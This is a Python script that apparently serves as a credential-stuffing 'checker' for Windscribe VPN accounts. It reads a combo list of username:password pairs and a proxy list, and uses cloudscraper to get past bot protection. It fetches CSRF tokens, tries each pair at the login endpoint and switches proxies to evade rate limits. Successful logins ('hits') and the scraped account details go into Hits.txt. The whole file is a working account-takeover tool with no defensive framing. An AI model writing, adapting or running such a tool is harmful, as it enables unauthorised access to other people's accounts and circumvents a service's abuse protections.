import cloudscraper
from bs4 import BeautifulSoup as bs
import os
import time




def load_combo(combo_file):

    combo_list = open(combo_file, 'r', encoding='utf-8').read().splitlines()

    return combo_list


def load_proxy(proxy_file):

    proxy_list = open(proxy_file, 'r').read().splitlines()

    return proxy_list

def wind_checker(combo: list, proxies: list):

    working_proxies = []

    reusecombo = []

    for com in combo: # combo: user:pass

        print(f'\nusing: {com}')

        while True:

            if len(reusecombo) > 0:

                print(f'using: {reusecombo[0]}')

                user = reusecombo[0].split(':')[0]

                password = reusecombo[0].split(':')[1]

                reusecombo.clear()
                
            else:

                user = com.split(':')[0]

                password = com.split(':')[1]


            if len(working_proxies) > 0:

                proxy = working_proxies[0]

                working_proxies.clear()

            else:

                for proxy in proxies:
                    print('using', proxy)
                    proxy_index = proxies.index(proxy)
                    proxies.pop(proxy_index)
                    break

            print(user, password)

            protos = [f'http://{proxy}', f'socks4://{proxy}']

            with cloudscraper.create_scraper() as cl:
                print('cl created')
                account_information = []

                cl = cloudscraper.create_scraper()

                head = {
                    'Origin': 'https://windscribe.com',
                    'Referer': 'https://windscribe.com/',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                    'Accept': '*/*',
                }

                print(protos)

                for pproxy in protos:

                    loob = False

                    reusecombo.clear()
                    working_proxies.clear()

                    try:

                        res = cl.post('https://res.windscribe.com/res/logintoken', headers=head, proxies={'https': f'{pproxy}'}, timeout=10)

                        if res.status_code == 200:
                            working_proxies.append(pproxy)
                            print(f'work: {working_proxies[0]} 200')
                            cs_tok = res.json()['csrf_token']
                            cs_time = res.json()['csrf_time']
                            print(cs_time, cs_tok)

                            da = {
                                'login': '1',
                                'upgrade': '0',
                                'csrf_time': f'{cs_time}',
                                'csrf_token': f'{cs_tok}',
                                'username': f'{user}',
                                'password': f'{password}',
                                # 'code': ''
                            }

                            head2 = {
                                'Origin': 'https://windscribe.com',
                                'Referer': 'https://windscribe.com/login',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                                'Accept': '*/*',
                                'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }

                            try:
                                print(working_proxies[0])
                                res = cl.post(url = 'https://windscribe.com/login', headers=head2, data=da, allow_redirects=True, proxies={'https': f'{working_proxies[0]}'}, timeout=10)
                                print(f'work: {working_proxies[0]} last response')
                                if 'Could not log in with provided credentials' in res.text:
                                    print(f'[-] Wrong Combo: {com}')
                                    reusecombo.clear()
                                    loob = False
                                    break

                                elif 'Rate limited, please wait before trying to login again.' in res.text:
                                        print(f'dead prx {pproxy} Rate limited')
                                        reusecombo.append(com)
                                        loob = True
                                        continue
                                else:

                                    with open('ress.txt', 'a', encoding='utf-8') as f:
                                        f.write(res.text)
                                        f.close()
                                        
                                    print(f'[+] Hit Combo: {com}')

                                    head3 = {
                                            'Referer': 'https://windscribe.com/login',
                                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
                                            'Content-Type': 'application/x-www-form-urlencoded'
                                        }
                                    res = cl.get('https://windscribe.com/myaccount', headers=head3)

                                    sp = bs(res.text, 'html.parser')

                                    item = sp.find_all(name='div', attrs={'class': 'ma_item'})

                                    for s in item:
                                        spans = s.find_all('span')
                                        account = spans[0].getText().strip().splitlines()
                                        account_information.extend(account)
                                        
                                    with open('Hits.txt', 'a', encoding='utf-8') as hit:
                                        hit.writelines([f'{"*"*20}\nUsername: {account_information[0]}\nPassword: {da["password"]}\nMember Since: {account_information[1]}\nNext Reset: {account_information[8]}\nBandwidth Usage: {account_information[9]}{account_information[10]}\n{"*"*20}\n\n'])


                            except Exception as e:
                                print(f'dead prx {pproxy}')
                                reusecombo.append(com)
                                loob = True
                                continue

                        else:
                            print(res.status_code)
                            print(f'dead prx {pproxy}')
                            reusecombo.append(com)
                            loob = True
                            continue

                           
                    except Exception as e:
                        print(f'dead prx {pproxy}')
                        reusecombo.append(com)
                        loob = True
                        continue

                if loob:
                    time.sleep(2)
                    os.system('cls')
                    continue

                else:
                    time.sleep(2)
                    os.system('cls')
                    break


if __name__ == '__main__':

    combo = input('Combo: ')
    prx = input('prx: ')

    com = load_combo(combo)
    pr = load_proxy(prx)

    wind_checker(com, pr)

